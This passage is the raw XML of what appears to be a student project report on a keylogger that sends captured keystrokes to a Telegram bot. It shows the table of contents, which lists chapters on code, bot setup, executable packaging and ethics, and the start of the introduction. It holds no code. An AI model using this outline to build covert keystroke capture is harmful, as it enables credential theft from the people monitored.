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50F9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 1 – Introduction ………………… 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.1 Background ………………… 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.2 Problem Statement ………………… 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.3 Objectives of the Project ………………… 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.4 Scope of the Project ………………… 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.5 Applications and Relevance ………………… 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.6 Ethical Considerations ………………… 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.7 Proposed System Overview ………………… 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.8 Advantages over Existing Systems ………………… 6</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>1.9 Chapter Summary ………………… 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64102038" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 2 – Literature Survey ………………… 7</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.1 Introduction to Literature Survey ………………… 7</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.2 Historical Background of Keylogging ………………… 8</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.3 Comparative Review of Existing Tools ………………… 9</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Spyrix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Free Keylogger ………………… 10</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>PyKeylogger</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ………………… 11</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>KidLogger</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ………………… 12</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>– Telegram Bots ………………… 13</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.4 Advantages of Telegram over Email ………………… 14</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.5 Gaps Identified in Literature ………………… 15</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.6 Relevance of This Project ………………… 16</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>2.7 Summary of Findings ………………… 17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B0F449" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 3 – System Analysis &amp; Design ………………… 18</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.1 Introduction ………………… 18</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.2 Hardware Requirements ………………… 19</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.3 Software Requirements ………………… 20</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.4 Functional Requirements ………………… 21</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.5 Non-Functional Requirements ………………… 22</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.6 System Architecture ………………… 23</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.7 Architecture Diagram ………………… 24</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.8 Data Flow Diagram (DFD – Level 0) ………………… 25</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.9 Data Flow Diagram (DFD – Level 1) ………………… 26</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.10 Use Case Diagram ………………… 27</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.11 Sequence Diagram Explanation ………………… 28</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>3.12 Chapter Summary ………………… 29</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74988AFA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 4 – Implementation ………………… 30</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.1 Introduction ………………… 30</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.2 Tools and Libraries Used ………………… 31</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.3 Code Structure Overview ………………… 32</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.4 Code Listing ………………… 33</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.5 Detailed Code Explanation ………………… 34</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4.6 Setting up Telegram Bot ………………… 37</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.7 Running the Program ………………… 38</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.8 Packaging into an Executable ………………… 39</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.9 Testing ………………… 40</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.10 Security Notes in Implementation ………………… 41</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>4.11 Chapter Summary ………………… 42</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B189FB2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 5 – Results and Output ………………… 43</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.1 Introduction ………………… 43</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.2 Execution Results ………………… 44</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.3 Sample Output Screenshots ………………… 45</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.4 Detailed Test Cases ………………… 46</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.5 Performance Analysis ………………… 47</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.6 Advantages Observed During Testing ………………… 48</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.7 Limitations Observed ………………… 49</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.8 Screenshots of Results ………………… 50</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.9 Future Enhancements (Observed Needs) ………………… 51</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>5.10 Chapter Summary ………………… 52</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB32158" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 6 – Ethics &amp; Security ………………… 53</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.1 Introduction ………………… 53</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.2 Ethical Principles in Monitoring ………………… 54</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.3 Legal Considerations ………………… 55</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.4 Security Measures Implemented ………………… 56</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.5 Recommendations for Secure Use ………………… 57</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.6 Ethical Future Enhancements ………………… 58</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>6.7 Chapter Summary ………………… 59</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6512F0DA" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Chapter 7 – Conclusion and References ………………… 60</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.1 Introduction ………………… 60</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.2 Summary of the Project ………………… 61</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.3 Achievements ………………… 62</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.4 Advantages of the Telegram-Based Approach ………………… 63</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.5 Future Work ………………… 64</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.6 Reflection on Ethics and Learning ………………… 65</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.7 Conclusion ………………… 66</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>7.8 References ………………… 67</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AECAC4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Appendices ………………… 68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A58670" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Appendix A: Installation Guide ………………… 68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37234A3C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix B: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>BotFather</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Chat ID Screenshots ………………… 69</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE3A794" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="68"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Appendix C: Test Logs Samples ………………… 70</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473D93F8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Chapter 1 – Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206262B1" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.1 Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7970F2B8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">With the rapid growth of digital platforms, monitoring and securing user activity has become a critical concern in cybersecurity, digital forensics, and system administration. One of the most widely discussed tools in this domain is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>keylogger</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>—a program that records every keystroke on a system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1C758D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Keyloggers have a dual reputation: while they can be misused for malicious purposes such as stealing credentials, they also serve important </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>legitimate roles</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in digital forensics, parental monitoring, productivity research, and cybersecurity training.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D6940A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">This project, titled </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
